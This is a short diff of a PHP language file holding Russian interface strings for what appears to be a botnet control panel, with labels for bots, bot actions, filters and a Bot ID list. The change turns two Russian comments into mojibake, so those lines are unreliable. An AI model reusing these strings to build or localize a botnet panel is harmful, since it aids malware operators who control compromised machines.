@@ -3,7 +3,7 @@ define('LNG_BOTNET', 'Боты');
 
 define('LNG_BOTNET_BOTSACTION', 'Действие над ботами:');
 
-//Фильтр.
+//P ¤ Pepsi "SЊS, SЂ.
 define('LNG_BOTNET_FILTER_TITLE',          'Фильтр');
 
 define('LNG_BOTNET_FILTER_BOTS',           'Боты:');
@@ -31,7 +31,7 @@ define('LNG_BOTNET_FILTER_COMMENT_FALSE',  'Нет');
 define('LNG_BOTNET_FILTER_RESET',          'Сброс формы');
 define('LNG_BOTNET_FILTER_SUBMIT',         'Применить');
 
-//Список.
+//RЎRїReSЃRѕRє.
 define('LNG_BOTNET_LIST',            'Результат (%s):');
 define('LNG_BOTNET_LIST_BOTID',      'Bot ID');
 define('LNG_BOTNET_LIST_BOTNET',     'Ботнет');
